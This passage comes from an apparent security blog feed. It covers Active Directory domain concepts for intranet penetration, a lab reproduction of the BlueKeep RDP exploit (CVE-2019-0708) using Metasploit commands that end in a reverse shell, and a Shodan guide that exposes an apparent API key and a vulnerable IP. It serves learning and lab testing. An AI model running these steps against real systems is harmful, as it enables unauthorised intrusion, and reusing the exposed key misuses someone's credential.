Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li><li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li><li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li></ul><h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul><li>单域</li><li>父域、子域</li><li>域树</li><li>域森林</li><li>DNS域名服务器</li></ul><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p><p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p><p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p><p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p><p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul><li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p></li><li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p></li><li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p></li></ul><p>abc.com 是一级域</p><p>asia是二级域</p><p><img src="/posts/44578/1.png" alt></p><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="/posts/44578/2.png" alt></p><h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul><li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li><li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li><li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li></ul><h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul><li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li><li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li><li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li></ul><p>**<br>逻辑结构**</p><ul><li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li><li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li></ul><p><strong>活动目录的主要功能</strong></p><ol><li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li><li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li><li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li><li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li><li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li><li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li></ol><h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul><li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li><li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li></ul><h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="/posts/44578/3.png" alt></p><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul><li>两个防火墙之间的空间被称为DMZ。</li><li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li><li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li><li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li><li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li></ul><h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure><ul><li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li><li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li></ul><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-内网&quot;&gt;&lt;a href=&quot;#0x00-内网&quot; class=&quot;headerlink&quot; title=&quot;0x00 内网&quot;&gt;&lt;/a&gt;0x00 内网&lt;/h2&gt;&lt;p&gt;局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://mysecroad.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="http://mysecroad.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域" scheme="http://mysecroad.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708本地复现</title>
    <link href="http://mysecroad.github.io/posts/16205.html"/>
    <id>http://mysecroad.github.io/posts/16205.html</id>
    <published>2019-09-16T12:19:42.000Z</published>
    <updated>2020-04-26T13:17:05.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2019-0708是微软于2019年5月14日发布的一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发。该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。</p><p>2019年09月07日，@rapid7 在其metasploit-framework仓库公开发布了CVE-2019-0708的利用模块，漏洞利用工具已经开始扩散，已经构成了蠕虫级的攻击威胁。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line">Windows server 2008</span><br><span class="line">Windows server 2008 R2</span><br><span class="line">Windows 2003</span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows server 2008 R2   IP: 192.168.72.140</span><br><span class="line">kali Linux</span><br></pre></td></tr></table></figure><h3 id="Windows-server-2008-R2"><a href="#Windows-server-2008-R2" class="headerlink" title="Windows server 2008 R2"></a>Windows server 2008 R2</h3><p><strong>开启3389</strong><br><img src="/posts/16205/1.png" alt></p><p><strong>修改注册表</strong><br><code>Win + R</code> 输入 <code>regedit</code> 进入注册表编辑器，按以下目录找到 <code>fDisableCam</code> 并将值改为0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam &#x3D; 0</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/2.png" alt></p><h3 id="kali-Linux"><a href="#kali-Linux" class="headerlink" title="kali Linux"></a>kali Linux</h3><p><strong>下载文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;TinToSer&#x2F;bluekeep-exploit</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/3.png" alt><br>可以看到有四个.rb后缀的文件，接下来将它们放至相应的目录（rdp目录需要自己创建）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd bluekeep-exploit</span><br><span class="line">cp rdp.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;</span><br><span class="line">cp rdp_scanner.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;</span><br><span class="line">cp cve_2019_0708_bluekeep.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p><strong>启动msf</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/4.png" alt></p><p><strong>重新加载所有模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/5.png" alt><br><strong>搜索漏洞模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve_2019_0708</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/6.png" alt></p><p><strong>开始利用</strong></p><p>使用 <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> 启用0708RDP攻击模块</p><p>使用 <code>info</code> 可以查看工具相关信息以及设置<br><img src="/posts/16205/7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可以看到我们需要设置的选项主要为RHOSTS \ RPORT \ target</span><br><span class="line">使用set RHOSTS 设置靶机IP</span><br><span class="line"></span><br><span class="line">使用set RPORT 设置靶机PORT</span><br><span class="line"></span><br><span class="line">使用set target ID数字（可选为1-4）每种都代表了机器架构</span><br><span class="line">在我的复现环境中使用VMWare，所以使用target 3即可，如若不行尝试使用1，2，4</span><br></pre></td></tr></table></figure><p>使用 <code>show options</code> 查看设置情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET &#x3D; random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET &#x3D; random</span><br><span class="line">   RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic targeting via fingerprinting</span><br></pre></td></tr></table></figure><p><strong>更改设置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.10.10  &#x2F;&#x2F;设置目标主机（win server 2008 R2）</span><br><span class="line">set rport 3389   &#x2F;&#x2F;设置目标端口（此处不用设置）</span><br><span class="line">set target 3</span><br></pre></td></tr></table></figure><p><img src="/posts/16205/8.png" alt></p><p>设置完参数之后，使用 <code>run</code> 开启攻击<br><img src="/posts/16205/9.png" alt></p><p>反弹shell成功！！！</p><h2 id="0x04-遇到的问题"><a href="#0x04-遇到的问题" class="headerlink" title="0x04 遇到的问题"></a>0x04 遇到的问题</h2><ol><li><p>加载模块失败</p><p>出现了 <code>WARNING! The following modules could not be loaded!</code> 错误，提示我们新加入的模块无法被加载。</p><p>这个问题我一开始在网上也没找到相关的解决办法，我是直接安装的 <code>2019.03</code> 版本的，没在出现这个问题。</p><p>后来在网上看到这篇文章貌似可以： <a href="https://blog.csdn.net/weixin_42380348/article/details/100642788" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42380348/article/details/100642788</a></p></li><li><p>每次攻击出现蓝屏，然后靶机关机</p><p>设置完参数之后，开始攻击run，靶机出现蓝屏，然后关机<br><img src="/posts/16205/10.png" alt></p><p>kali出现<br><img src="/posts/16205/11.png" alt></p><p>这里可以将参数 <code>target</code> 设置为其他ID，我是设置为2，然后run。</p></li></ol><h2 id="0x05-漏洞原理"><a href="#0x05-漏洞原理" class="headerlink" title="0x05 漏洞原理"></a>0x05 漏洞原理</h2><p>原理还是等有时间在搞吧。。。。。</p><p>参考： <a href="https://www.anquanke.com/post/id/181577" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181577</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;CVE-2019-0708是微软于2019年5月14日发布的一个严重的RDP远程代码执行漏洞。该漏洞
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>搜索引擎</title>
    <link href="http://mysecroad.github.io/posts/20144.html"/>
    <id>http://mysecroad.github.io/posts/20144.html</id>
    <published>2019-09-16T06:53:45.000Z</published>
    <updated>2020-04-26T09:24:33.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Shodon"><a href="#0x00-Shodon" class="headerlink" title="0x00 Shodon"></a>0x00 Shodon</h1><p>Shodon可以进行全球的设备搜索，物联天下，shodan第一。</p><p><img src="/posts/20144/1.png" alt></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><strong>搜索语法：</strong></p><ul><li>hostname: 搜索指定的主机或域名，例如，hostname:”google”</li><li>port: 搜索指定的端口或服务，例如，port:”21”</li><li>country: 搜索指定的国家，例如，country:”CN”</li><li>city: 搜索指定的城市，例如，city:”Zhengzhou”</li><li>org: 搜索指定的组织或公司，例如，org:”baidu”</li><li>isp: 搜索指定的ISP供应商，例如，isp:”China Telecom”</li><li>product: 搜索指定的操作系统/软件/平台，例如，product:”Apache httpd”</li><li>version: 搜索指定的软件版本，例如，version:”1.6.2”</li><li>geo: 搜索指定的地理位置，参数为经纬度，例如，geo:”3.8639,117.2808”</li><li>before/after: 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如，before:”11-11-11”</li><li>net: 搜索指定的IP地址或子网，例如，net:”210.45.36.0/24”</li></ul><p><strong>举个栗子：</strong></p><p>查找位于郑州的Apache服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache city:&quot;Zhengzhou&quot;</span><br></pre></td></tr></table></figure><p>查找位于国内的Nginx服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx country:&quot;CN&quot;</span><br></pre></td></tr></table></figure><p>查找指定网段的华为设备：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huawei net:&quot;61.191.146.0&#x2F;24&quot;</span><br></pre></td></tr></table></figure><p><strong>Explore</strong><br>点击 Shodan 搜索栏右侧的 “Explore” 按钮，就会得到很多别人分享的搜索语法<br><img src="/posts/20144/4.png" alt></p><p>我们可以在别人搜索的基础上进行修改。</p><p><strong>其他</strong><br>Shodan 不仅可以查找网络设备，它还具有其他相当不错的功能。</p><p>Exploits： 每次查询完后，点击页面上的 “Exploits” 按钮，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：<a href="https://exploits.shodan.io/welcome" target="_blank" rel="noopener">https://exploits.shodan.io/welcome</a></p><p>地图： 每次查询完后，点击页面上的 “Maps” 按钮，Shodan 会将查询结果可视化的展示在地图当中</p><p>报表： 每次查询完后，点击页面上的 “Create Report” 按钮，Shodan 就会帮我们生成一份精美的报表。</p><h2 id="命令行下使用Shodon"><a href="#命令行下使用Shodon" class="headerlink" title="命令行下使用Shodon"></a>命令行下使用Shodon</h2><p>Shodan 是由官方提供的 Python 库的，项目位于：<a href="https://github.com/achillean/shodan-python" target="_blank" rel="noopener">https://github.com/achillean/shodan-python</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shodan</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;achillean&#x2F;shodan-python.git &amp;&amp; cd shodan-python</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>安装完成之后我们看一下帮助信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ shodan -h</span><br><span class="line">Usage: shodan-script.py [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  alert       Manage the network alerts for your account</span><br><span class="line">  convert     Convert the given input data file into a different format.</span><br><span class="line">  count       Returns the number of results for a search</span><br><span class="line">  data        Bulk data access to Shodan</span><br><span class="line">  domain      View all available information for a domain</span><br><span class="line">  download    Download search results and save them in a compressed JSON...</span><br><span class="line">  honeyscore  Check whether the IP is a honeypot or not.</span><br><span class="line">  host        View all available information for an IP address</span><br><span class="line">  info        Shows general information about your account</span><br><span class="line">  init        Initialize the Shodan command-line</span><br><span class="line">  myip        Print your external IP address</span><br><span class="line">  org         Manage your organization&#39;s access to Shodan</span><br><span class="line">  parse       Extract information out of compressed JSON files.</span><br><span class="line">  radar       Real-Time Map of some results as Shodan finds them.</span><br><span class="line">  scan        Scan an IP&#x2F; netblock using Shodan.</span><br><span class="line">  search      Search the Shodan database</span><br><span class="line">  stats       Provide summary information about a search query</span><br><span class="line">  stream      Stream data in real-time.</span><br><span class="line">  version     Print version of this tool.</span><br></pre></td></tr></table></figure><h3 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h3><p><strong>init</strong><br>初始化命令行工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ shodan init [API_Key]  btrs7DoaGz00wK5Me1fpKITKLGvuGtQM</span><br><span class="line">Successfully initialized</span><br></pre></td></tr></table></figure><p><strong>count</strong><br>返回查询结果的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ shodan count ...（待补）</span><br></pre></td></tr></table></figure><p><strong>download</strong><br>将搜索结果下载到一个文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载1000条结果，如果想下载更多结果需要增加 –limit 参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan download microsoft-data microsoft iis 6.0</span><br></pre></td></tr></table></figure><p><strong>parse</strong><br>我们可以使用 parse 来解析之前下载数据，它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，当然更可以用作传递给其他处理脚本的管道。例如，我们想将上面下载的数据以CSV格式输出IP地址、端口号和组织名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz</span><br></pre></td></tr></table></figure><p><strong>host</strong><br>查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan host [IP]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ shodan host 189.201.128.250</span><br><span class="line">189.201.128.250</span><br><span class="line">Hostnames:               ptr.reditmx.com</span><br><span class="line">City:                    Mexico City</span><br><span class="line">Country:                 Mexico</span><br><span class="line">Organization:            Metro Net, S.A.P.I. de C.V.</span><br><span class="line">Updated:                 2019-09-06T19:54:11.283180</span><br><span class="line">Number of open ports:    2</span><br><span class="line">Vulnerabilities:         Heartbleed</span><br><span class="line"></span><br><span class="line">Ports:</span><br><span class="line">    443&#x2F;tcp</span><br><span class="line">        |-- SSL Versions: -SSLv2, -TLSv1.3, SSLv3, TLSv1, TLSv1.1, TLSv1.2</span><br><span class="line">        |-- Diffie-Hellman Parameters:</span><br><span class="line">                Bits:          1024</span><br><span class="line">                Generator:     2</span><br><span class="line">                Fingerprint:   RFC2409&#x2F;Oakley Group 2</span><br><span class="line">   8009&#x2F;tcp FortiGate Endpoint Control httpd</span><br></pre></td></tr></table></figure><p><strong>search</strong><br>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据。当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0</span><br></pre></td></tr></table></figure><h3 id="脚本调用shodan库"><a href="#脚本调用shodan库" class="headerlink" title="脚本调用shodan库"></a>脚本调用shodan库</h3><p>安装shodan库，在使用shodan库之前需要初始化链接API，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import shodan</span><br><span class="line"></span><br><span class="line">SHODAN_API_KEY &#x3D; &quot;API_Key&quot;</span><br><span class="line"></span><br><span class="line">api &#x3D; shodan.Shodan(SHODAN_API_KEY)</span><br></pre></td></tr></table></figure><p>随后我们就可以搜索数据了，示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">results &#x3D; api.search(&#39;apache&#39;)</span><br><span class="line"># 显示结果</span><br><span class="line">print(&quot;Results found: %s&quot; % results[&#39;total&#39;])</span><br><span class="line">for results in results[&#39;ip_str&#39;]:</span><br><span class="line">print(results[&#39;ip_str&#39;])</span><br><span class="line">except shodan.APIError, e:</span><br><span class="line">print(&quot;Error: %s&quot; % 